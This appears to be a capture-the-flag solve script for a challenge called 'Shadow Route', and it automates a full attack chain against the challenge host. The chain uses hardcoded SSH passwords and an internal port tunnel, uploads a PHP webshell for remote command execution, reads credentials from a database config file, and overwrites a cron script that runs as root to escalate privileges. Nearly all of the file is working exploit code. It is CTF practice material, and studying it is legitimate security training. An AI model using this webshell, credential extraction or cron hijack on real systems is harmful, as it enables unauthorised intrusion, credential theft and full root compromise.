#!/usr/bin/env python3
"""
Challenge: Shadow Route
Category:  misc
Platform:  UniVsThreats 2026 Quals

Chain: SSH tunnel → /stargate login → PHP upload → RCE → nova creds → cron privesc → flag
"""
import paramiko
import requests
import time
import threading
import socket
import select
import sys
import re

# === CONFIGURACIÓN ===
HOST = sys.argv[1] if len(sys.argv) > 1 else "194.102.62.166"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 26244
PILOT_USER = "pilot"
PILOT_PASS = "docking-request"
ASTRID_USER = "astrid"
ASTRID_PASS = "apollo1"
NOVA_USER = "nova"
NOVA_PASS = "N3bul@C0re!9987648723486326483246876vhgzxbcvhjdsa"


def ssh_connect(user, passwd):
    c = paramiko.SSHClient()
    c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    c.connect(HOST, PORT, user, passwd, timeout=10)
    return c


def forward_tunnel(local_port, remote_host, remote_port, transport):
    """SSH -L equivalent via paramiko."""
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(("127.0.0.1", local_port))
    server.listen(5)
    server.settimeout(1)

    def handle_client(cs):
        try:
            chan = transport.open_channel("direct-tcpip", (remote_host, remote_port), cs.getpeername())
            if chan is None:
                cs.close()
                return
            while True:
                r, w, x = select.select([cs, chan], [], [], 1)
                if cs in r:
                    d = cs.recv(4096)
                    if not d:
                        break
                    chan.send(d)
                if chan in r:
                    d = chan.recv(4096)
                    if not d:
                        break
                    cs.send(d)
            chan.close()
            cs.close()
        except:
            pass

    def server_loop():
        while True:
            try:
                cs, _ = server.accept()
                threading.Thread(target=handle_client, args=(cs,), daemon=True).start()
            except socket.timeout:
                continue
            except:
                break

    threading.Thread(target=server_loop, daemon=True).start()
    return server


def discover_station_ip(client):
    """Run nmap -sn to find station IP."""
    chan = client.get_transport().open_session()
    chan.get_pty()
    chan.invoke_shell()
    time.sleep(1)
    chan.recv(4096)
    chan.send(b"nmap -sn 127.13.37.0/24\n")
    time.sleep(5)
    data = b""
    while chan.recv_ready():
        data += chan.recv(65536)
    chan.close()
    m = re.search(r"report for (127\.13\.37\.\d+)", data.decode())
    return m.group(1) if m else None


def exploit():
    # ===  SSH as pilot, discover station IP ===
    print(f"[*] Target: {HOST}:{PORT}")
    print("[*]  Connecting as pilot...")
    pilot = ssh_connect(PILOT_USER, PILOT_PASS)
    station_ip = discover_station_ip(pilot)
    if not station_ip:
        print("[-] Could not discover station IP!")
        pilot.close()
        return
    print(f"[+] Station IP: {station_ip}")

    # ===  SSH -L tunnel to internal Apache ===
    print("[*]  Setting up SSH tunnel to Apache (9043)...")
    tunnel = forward_tunnel(19043, station_ip, 9043, pilot.get_transport())
    time.sleep(0.5)
    BASE = "http://127.0.0.1:19043"

    # ===  Login to /stargate as astrid ===
    print(f"[*]  Logging into /stargate as {ASTRID_USER}...")
    sess = requests.Session()
    r = sess.post(f"{BASE}/stargate/", data={"username": ASTRID_USER, "password": ASTRID_PASS}, timeout=5)
    if "dashboard" in r.url or "dashboard" in r.text.lower():
        print("[+] Logged in as astrid")
    else:
        print("[-] Login failed!")
        tunnel.close()
        pilot.close()
        return

    # ===  Upload PHP webshell ===
    print("[*]  Uploading PHP webshell to /cosmos-data/...")
    webshell = b'<?php system($_GET["cmd"]); ?>'
    files = {"datafile": ("rce.php", webshell, "application/x-php")}
    sess.post(f"{BASE}/stargate/dashboard.php", files=files, data={"upload_telemetry": "1"}, timeout=5)

    r = sess.get(f"{BASE}/cosmos-data/rce.php?cmd=id", timeout=5)
    if "www-data" in r.text:
        print(f"[+] RCE confirmed: {r.text.strip()}")
    else:
        print(f"[-] Webshell failed: {r.text[:100]}")
        tunnel.close()
        pilot.close()
        return

    # ===  Extract nova password from db_config.php ===
    print("[*]  Extracting db_config.php...")
    r = sess.get(f"{BASE}/cosmos-data/rce.php?cmd=cat+/var/www/html/stargate/db_config.php", timeout=5)
    if "sync_pass" in r.text:
        print("[+] db_config.php contains sync_pass for nova")
    else:
        print("[-] db_config.php not found, trying to locate...")
        r2 = sess.get(f"{BASE}/cosmos-data/rce.php?cmd=find+/var/www+-name+db_config.php", timeout=5)
        print(f"    {r2.text.strip()}")

    tunnel.close()
    pilot.close()

    # ===  SSH as nova ===
    print(f"[*]  SSH as {NOVA_USER}...")
    try:
        nova = ssh_connect(NOVA_USER, NOVA_PASS)
        print("[+] Nova shell obtained!")
    except Exception as e:
        print(f"[-] SSH as nova failed: {e}")
        return

    # ===  Verify cron + writable script ===
    print("[*]  Checking orbit-sync.sh permissions...")
    _, stdout, _ = nova.exec_command("ls -la /home/nova/orbit-sync.sh")
    perms = stdout.read().decode().strip()
    print(f"    {perms}")

    _, stdout, _ = nova.exec_command("grep orbit /etc/crontab")
    cron = stdout.read().decode().strip()
    print(f"    cron: {cron}")

    # ===  Overwrite orbit-sync.sh for root privesc ===
    print("[*]  Overwriting orbit-sync.sh...")
    nova.exec_command("echo 'cp /root/root.txt /tmp/flag.txt && chmod 444 /tmp/flag.txt' " "> /home/nova/orbit-sync.sh")

    print("[*] Waiting 65s for cron execution...")
    time.sleep(65)

    # ===  Read flag ===
    _, stdout, _ = nova.exec_command("cat /tmp/flag.txt")
    flag = stdout.read().decode().strip()

    if flag:
        print(f"\n{'='*60}")
        print(f"[!!!] FLAG: {flag}")
        print(f"{'='*60}")
    else:
        print("[-] Flag not yet available, waiting 30 more seconds...")
        time.sleep(30)
        _, stdout, _ = nova.exec_command("cat /tmp/flag.txt")
        flag = stdout.read().decode().strip()
        print(f"\n[!!!] FLAG: {flag}")

    nova.close()
    print("\n[*] Done.")


if __name__ == "__main__":
    exploit()
